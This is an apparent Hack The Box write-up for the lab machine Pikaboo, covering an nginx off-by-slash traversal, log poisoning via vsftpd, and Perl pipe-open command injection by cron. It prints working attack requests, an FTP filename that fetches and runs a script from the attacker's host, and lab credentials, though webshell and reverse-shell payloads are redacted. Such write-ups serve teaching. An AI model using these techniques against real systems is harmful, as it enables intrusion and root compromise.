---
layout: post
title: "The Slash That Wasn't There"
subtitle: "HTB Pikaboo, where a missing slash walks you past the bouncer, a log file becomes a shell, and Perl mistakes a filename for an order"
date: 2021-12-11 12:00:00 +0000
description: "A single missing slash slips you past the front desk, FTP logs hand you a shell, and a Perl script reads a filename as a command to give up root."
image: /assets/og/the-slash-that-wasnt-there.png
tags: [hackthebox, writeup]
---

Pikaboo is a box about punctuation. Not the dramatic kind, not a buffer that overflows or a kernel that melts, but the quiet kind. A slash that should have been there and wasn't. A pipe character at the front of a filename that nobody thought to strip. Every door on this machine swings open because a single piece of punctuation got read the wrong way by something that trusted it too much. You walk past an authentication wall because nginx forgot a trailing slash. You turn a log file into a shell because a web app will include anything you name. And you become root because a Perl script reads a filename and, seeing a pipe, decides the filename is actually a command to run. Three small marks, three open doors. The box is named for hide-and-seek, and the joke is that nothing here was ever really hidden. It was just one keystroke out of place.

```
        P I K A B O O
        =============
        GET /admin../admin_staging/
              |   the slash that wasn't there
              v
        nginx glues your path on raw,
        apache normalizes the .. away,
        and the staff door opens itself.
              |
              v
        a log becomes a shell.
        a filename becomes an order.
                                            隠
```

## 0x01 · the front desk

Three ports answer, and the list is short enough to read like a haiku.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    nginx 1.14.2
```

FTP, SSH, and a web server. Nothing here is a fossil and nothing here screams a CVE at you, which is the first hint that Pikaboo is going to make you work for every inch. The web root is a fan page for a Pokedex-style app, cute and mostly inert. The interesting thing is what the page headers and behavior quietly admit. nginx is out front, but it is a reverse proxy, passing certain requests back to an Apache instance hiding on localhost. Two servers stacked behind one address. Hold that thought, because the seam where two servers meet is exactly where this box splits open.

There is an `/admin` path, and it asks for a password you do not have. A normal day ends here. Pikaboo's whole first act is about the fact that the lock on that door is hanging on a frame with a gap in it.

## 0x02 · the slash that wasn't there

When nginx proxies requests to a backend, the admin writes a rule that says where to send them. The rule on Pikaboo looks roughly like `location /admin { proxy_pass http://127.0.0.1:81/admin/; }`, and the bug lives in the missing slash after the word `admin` in the location line. With no trailing slash on the location, nginx takes whatever you typed after `/admin` and glues it onto the backend path without cleaning it up first.

So you request `/admin../admin_staging/`. nginx sees the prefix `/admin`, strips it, and pastes the leftover `../admin_staging/` onto the backend address. Apache receives a path with a `..` in it, dutifully normalizes the directory traversal away, and serves you `/admin_staging/` on port 81. A whole second admin panel that nobody bolted a lock to, because it was only ever supposed to be reachable from inside.

Think of it like a hotel with a key-carded staff door. The front desk only checks the words on your room request, and it is told to reject anything that starts with "staff." So you ask for "staff and then back up one floor and over to the unmarked office." The desk sees your request starts with the approved prefix, waves you through, and the elevator quietly does the backing-up part on its own. You end up in a room the desk never meant to send you to, and nobody checked you a second time once you were past the lobby.

```
# the locked door
$ curl http://10.10.10.249/admin/
401 Unauthorized

# the door beside it, with a gap in the frame
$ curl http://10.10.10.249/admin../admin_staging/
200 OK   <staging panel, no auth>
```

This is the off-by-slash, a documented nginx alias-and-proxy misconfiguration, and it is pure: one character of carelessness in a config file turns an authenticated panel into an open one. There was never a vulnerability in the code behind the door. The door was just standing a quarter-inch off its frame.

## 0x03 · a log that learned to talk

The staging panel loads its sub-pages with a parameter, the oldest tell in the book: `page=user.php`. Any time an app picks a file to load based on text you control, you are looking at a local file inclusion waiting to happen. The parameter does not show you the file. It includes it, and on a PHP app, including a file means executing it.

A little fuzzing on `page=` confirms the panel will reach outside its own folder and pull files off the system by relative path. The prize it can reach is the FTP server's log.

```
http://10.10.10.249/admin../admin_staging/?page=/var/log/vsftpd.log
```

That log is the whole trick. vsftpd writes every failed login attempt to disk, and it writes down the username you tried. So you do not need a real FTP account. You connect to FTP and offer a username that is not a name at all, but a snippet of PHP. The server rejects your login, and as it does, it carefully records your "username" into `vsftpd.log`. Then you load that log through the inclusion bug, PHP runs every line looking for code, and finds the line you planted.

This is log poisoning. Picture a security guard who writes down the name of everyone he turns away, then later reads his own notebook aloud to a machine that does whatever the notebook says. You give him a "name" that is really an instruction. He turns you away, writes it down exactly, and the machine reads it back and obeys. The guard did his job perfectly. That was the problem.

```
# plant the line as an FTP "username"
$ ftp 10.10.10.249
Name: <?php [ one-line webshell: run the cmd request parameter ] ?>
530 Login incorrect.

# then read the log back through the LFI and pass a command
http://10.10.10.249/admin../admin_staging/?page=/var/log/vsftpd.log&cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I am not printing the real webshell, and that restraint is the point, not prudishness. The literal string is a handful of characters and it is the textbook PHP backdoor. The moment that exact line touches disk, any antivirus alive flags the file as malware, which is the most honest possible review of how dangerous one short line can be. So picture it. Trade the webshell line for a proper callback, [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ], poison the log with that, load the log, and a prompt drops into your listener as `www-data`.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.249
www-data@pikaboo:/$
```

## 0x04 · the filename that gave an order

`www-data` is a tourist. The climb to root starts where it usually does, with a cron job that someone wired up to run as the most powerful account on the box.

```
$ cat /etc/crontab
* * * * * root /usr/local/bin/csvupdate_cron
```

Every minute, as root, the box runs a wrapper that walks each folder under `/srv/ftp/` and feeds the CSV files inside to a Perl script, `/usr/local/bin/csvupdate`. Read that script and the heart of the matter is the diamond operator, Perl's `<>`, which reads through the filenames handed to it and opens each one. The catch is in how old Perl opens a file. The two-argument form of `open` has a piece of "magic" baked in. If a filename begins or ends with a pipe character, Perl does not open a file at all. It runs the rest of the name as a shell command.

So the script never needed a bug in its logic. The bug is in the dialect. A file literally named `|command` is not data. To Perl's magic open, it is a request to execute `command`. And because the cron runs as root, that command runs as root.

Think of it like a clerk with a strict rule: any document whose title starts with an arrow, you do not file it, you read the title out loud to the boss and the boss does it. Hand him a folder full of normal reports and he files them. Slip in one document titled "→ unlock the vault" and he reads it aloud, and the vault opens, because that was always the rule. Nobody told him a title could be a trap.

To plant a file with that poisonous name, you need to write into `/srv/ftp/`, which means you need a real FTP account. Those credentials are sitting in the app's config, pointing at the box's LDAP directory.

```
$ cat /opt/pokeapi/config/settings.py
AUTH_LDAP_BIND_DN = "cn=binduser,ou=users,dc=pikaboo,dc=htb"
AUTH_LDAP_BIND_PASSWORD = "J~42%W?PFHl]g"
```

With the bind user you can query LDAP and pull the directory apart. Among the entries is the FTP user `pwnmeow`, whose password sits in the record encoded in base64, which is a costume, not a lock.

```
$ ldapsearch -x -H ldap://10.10.10.249 \
    -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' \
    -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb' | grep -i pass

$ echo 'XzBHMHRUNF9DNHRjSF8nM21fNGxMIV8=' | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
```

Now you have FTP as `pwnmeow`. Log in, change into one of the per-type folders the cron will read, and create a file whose name is the order you want root to carry out. The name must dodge forward slashes, since a slash is a path separator, so you point the command at a small script you serve from your own box and pipe it into a shell.

```
$ ftp 10.10.10.249       # as pwnmeow
ftp> cd /srv/ftp/Bug
ftp> put empty.csv "|curl 10.10.14.4/iceberg|bash;.csv"
```

Within a minute the cron wakes, walks the folder, hands that filename to Perl, and Perl's magic open reads the leading pipe and runs your command as root. The script you serve is just [ a bash reverse shell calling back to 10.10.14.4 on 443 ], and the shell that lands is wearing root's coat.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.249
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

```
# and the one we passed on the way up
www-data@pikaboo:/$ cat /home/pwnmeow/user.txt
████████████████████████████████
```

## 0x05 · the honest caveat

It is tempting to file Pikaboo under "too many steps, too niche, not real life." Every link in the chain feels like a lab puzzle. But look at what each link actually is, because the costumes are the only exotic part. The off-by-slash is one missing character in a config file, the most common kind of mistake there is, made by someone who was tired and copied a `location` block and never noticed the slash was gone. That single typo undid an authentication wall completely. No code was wrong. The lock was real. The frame had a gap.

The log poisoning is the same confession the whole industry keeps making: a value that was supposed to be a label, an FTP username, got somewhere it could be executed. The app trusted that a log file held only inert text. It held a command, because an attacker decided their name was a program. And the Perl magic open is the oldest lesson in this catalog wearing a 1990s sweater. A filename is data. The moment a program lets the contents of a filename reach into a shell and pull a lever, the filename is not data anymore, it is an instruction, and you have rebuilt command injection in yet another costume.

That is the thread running through every box worth doing. Somewhere, something drew no line between a thing that describes and a thing that commands. A path prefix that should only point became a way to traverse. A username that should only label became code. A filename that should only name became an order. None of these needed a zero-day. They needed someone, once, to forget that the envelope is not the letter, and that a stranger gets to write whatever they want on the outside.

## 0x06 · outro

```
a missing slash waved you past the desk.
a log wrote down your lie and read it back as truth.
a filename was never a name. it was a sentence with a verb.

three marks of punctuation, three doors, none of them forced.
each one held open by something that trusted what it was handed.

mind the slash. salt the logs. never let a name give orders. wear black.

                                                            EOF
```

---

*HTB: Pikaboo, retired 04 Dec 2021. A hard Linux box that is really a lecture on punctuation, where a slash, a log line, and a pipe character each get mistaken for permission. The seam between two servers is where it splits, and the front door was never the door.*